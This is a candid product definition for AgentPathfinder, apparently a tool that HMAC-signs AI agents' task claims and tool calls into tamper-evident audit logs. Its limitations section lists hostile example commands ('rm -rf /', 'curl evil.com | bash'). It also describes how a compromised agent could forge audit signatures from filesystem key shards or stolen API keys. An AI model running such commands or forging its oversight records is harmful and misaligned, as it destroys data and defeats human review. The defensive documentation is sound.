# AgentPathfinder — Honest Product Definition
**Version:** 1.3.0 (v1.2.x base + Tool Chain Audit)  
**Status:** GitHub only. Not on ClawHub.  
**Tech:** HMAC-SHA256 signing, XOR-sharded keys, tamper-evident JSONL audit trails  
**Author:** CertainLogic AI

---

## What AgentPathfinder IS

A **signed task tracker** for AI agents. Think of it as a **receipt system** for what your agent claimed it did.

You create a task (a checklist of steps). Your agent claims each step is done. Every claim is **cryptographically signed** so you can:
- Know which agent claimed what and when
- Detect if the record was edited afterward
- Resume if your agent crashes mid-task

It does **not** check if the agent actually did the work.

---

## The 30-Second Pitch (Honest)

**"Most AI agents work on trust. You ask them to do 5 things, they report back that they're done, and you just believe them. AgentPathfinder gives you a cryptographic receipt of what was claimed. You still decide if you believe it — but nobody can edit the receipt later without you knowing."**

---

## Core Features (What It Actually Does)

### 1. Signed Task Steps
- Create a task with steps
- Agent claims step is done → claim is HMAC-signed with agent's API key
- Signature proves which agent made the claim
- If someone edits the JSONL after signing, HMAC verification fails on read

### 2. Tamper-Evident Audit Trail
- Every event (task_created, step_claimed, tool_invoked, tool_result) is HMAC-signed
- Read trail back and verify all signatures
- `verify_integrity()` reports tampered/corrupted counts
- **Important:** Detection, not prevention. File can still be deleted.

### 3. Task Resume
- Agent crashes after step 2 of 5? Read back which steps were claimed, resume from step 3
- Based on claims, not actual state. If the agent lied about step 2, you resume from a lie.

### 4. Tool Chain Audit (v1.3.0)
- Every tool call logged with full arguments and results
- Sub-tool chain tracking (parent exec → child read_file)
- Crash recovery: find tool calls stuck in "invoked" state
- Same HMAC signing as task events

### 5. Chat Notifications (v1.2.x+)
- SDK callbacks send step/task updates to your agent's chat channel
- Real-time progress without polling

---

## Critical Limitations (What It CANNOT Do)

### 1. Cannot Verify Work Actually Happened
This is the #1 misconception. AgentPathfinder signs **claims**, not **facts**.

```
Agent says: "I ran the tests → passed"
AgentPathfinder records: "Agent_X claimed test step done at 14:23"
AgentPathfinder does NOT: "Verify tests actually passed"
```

The signature proves **authorship**, not **truth**.

### 2. Cannot Prevent Tampering
- HMAC detects **edits**, not **deletion**
- Someone with filesystem access can delete the entire audit file
- Or replace it — but new file won't have valid HMACs without the audit key

**This is detection, not prevention.**

### 3. No Encryption at Rest
- Audit trails stored as plaintext JSONL
- Tool call args/results visible to anyone who can read the file
- Example: if you log `exec("curl API_KEY=secret...")`, the secret is in the audit log

### 4. Malicious Agent Can Forge Everything
**This is a critical vulnerability you must understand.**

If a compromised agent has:
- Access to the filesystem (where vault shards are stored)
- OR access to another agent's API key

It can:
- Reconstruct the master key from vault shards
- Forge valid signatures for any step/tool call
- Make it look like another agent did work

**This is inherent to the architecture.** Proposed fixes:
- Hardware TEE (Enterprise tier)
- Multi-sig step completion (Enterprise tier)
- Separate write-only audit volume (Medium effort)

### 5. Cannot Judge Command Safety
```
exec("rm -rf /")        → Signed successfully ✅
exec("echo hello")      → Signed successfully ✅
exec("curl evil.com | bash") → Signed successfully ✅
```

Signing is blind to content. **It is not a sandbox.**

### 6. Agent Forgery via API Key Theft
If `agent_1` steals `agent_2`'s API key, `agent_1` can claim steps as `agent_2`. The signature validates (correct key was used). The system can't tell it's an imposter.

### 7. No Runtime Isolation
- Does not sandbox or restrict what the agent can do
- Does not validate file operations, network calls, or command safety
- Pure logging layer, not a security layer

### 8. Performance Overhead
- Every event: HMAC compute (~0.1ms) + disk append (~1-5ms)
- 1000 tool calls = ~1-5 seconds of audit overhead
- Audit file grows unbounded (no retention policy in v1.3.0)

---

## Real Use Cases It Works For

### Use Case 1: Multi-Agent Accountability
**Scenario:** 3 agents work on a codebase. Agent A deploys to production.
**Problem:** Production breaks. Who deployed? When? What was running?
**Solution:** AgentPathfinder shows Agent A claimed "deploy" step at 09:15 with signature. You know exactly who. You still investigate if the deploy was actually correct.

### Use Case 2: Interrupted Long-Running Tasks
**Scenario:** Agent is processing 100 files, crashes at file 47.
**Problem:** Restarting from scratch burns API tokens.
**Solution:** Read audit trail, see which files were claimed processed, resume from file 48. You accept the risk that file 47 might not have been done right (based on claim).

### Use Case 3: Compliance Logging (Tool Audit)
**Scenario:** Enterprise needs a record of what their AI agent did.
**Problem:** "What command did the agent run on our production server?"
**Solution:** Tool audit trail shows: `exec("kubectl rollout restart deploy/app")` at 14:23 by Agent_X. Full command, full output. HMAC-signed.

### Use Case 4: Team Review
**Scenario:** Manager reviews what agent did this week.
**Problem:** No record of activity.
**Solution:** Audit trail is a signed log of all claims and tool calls. Human reviews claims and decides if they check out.

---

## Use Cases It Does NOT Work For

| Use Case | Why It Fails |
|----------|--------------|
| "I want to prevent agents from lying" | Cannot prevent lies. Only detects edited records. |
| "I want proof the agent did the work" | Proof of claim ≠ proof of work. |
| "I want to stop dangerous commands" | Not a sandbox. rm -rf signs just like echo. |
| "I want zero-trust agent security" | Filesystem access = forge capability. Need hardware. |
| "I want fully immutable audit logs" | File can be deleted. Need append-only storage. |
| "I want automatic quality verification" | Does not check if step output was correct. |

---

## Product Tiers

### Free Tier (v1.2.x — publish to ClawHub)
- Unlimited tasks
- Signed steps with HMAC
- Tamper-evident audit trail
- Task resume
- Chat notifications
- Static dashboard

**Honest value:** Receipt system for agent claims.

### Pro Tier (future)
- Multi-agent views
- Team dashboards
- Webhook notifications
- Retention policies

### Enterprise Tier (future, ~12 hours build)
- Hash chain (each event hashes previous event's hash)
- Append-only storage (S3 Object Lock or blockchain notarization)
- Encryption at rest (AES-256-GCM)
- Async batch logging (performance)
- Hardware TEE / multi-sig (prevents forged claims)
- Compliance exports (PDF, SOC2)

**Honest value:** Tamper-proof, compliance-grade audit infrastructure.

---

## What to Tell Customers vs YC

### To Customers (Honest)
> "AgentPathfinder creates a cryptographic receipt for everything your AI agent claims to have done. If someone edits the records, you'll know. It does not verify the claims are true — that's your review process. But it makes sure the record of what was claimed stays intact."

### To YC (Honest + Vision)
> "We've built the first tamper-evident task tracker for AI agents. Right now it proves authorship and detects edits. The next version adds tamper-proof immutability and hardware security for enterprise compliance. Market: every company running autonomous AI agents needs an audit trail. We're the only ones doing it with real cryptography."

---

## Summary Table

| Claim | True? | Notes |
|-------|-------|-------|
| Signs agent claims with HMAC | ✅ Yes | Real SHA-256 |
| Detects edited records | ✅ Yes | Verified in tests |
| Records who claimed what | ✅ Yes | Agent ID + timestamp |
| Tracks tool calls | ✅ Yes (v1.3) | Full args/results |
| Verifies agent did the work | ❌ No | Signs claims, not facts |
| Prevents tampering | ❌ No | Detects only |
| Prevents dangerous commands | ❌ No | Not a sandbox |
| Prevents forged claims | ❌ No | Filesystem access = forge |
| Encrypts audit logs | ❌ No | Plaintext JSONL |
| Immutable storage | ❌ No | File can be deleted |
| Zero external dependencies | ✅ Yes | Python stdlib only |

---

**Version:** 1.3.0  
**Last updated:** 2026-05-02  
**Maintainer:** Anton / CertainLogic AI  
**License:** MIT (base), proprietary extensions planned
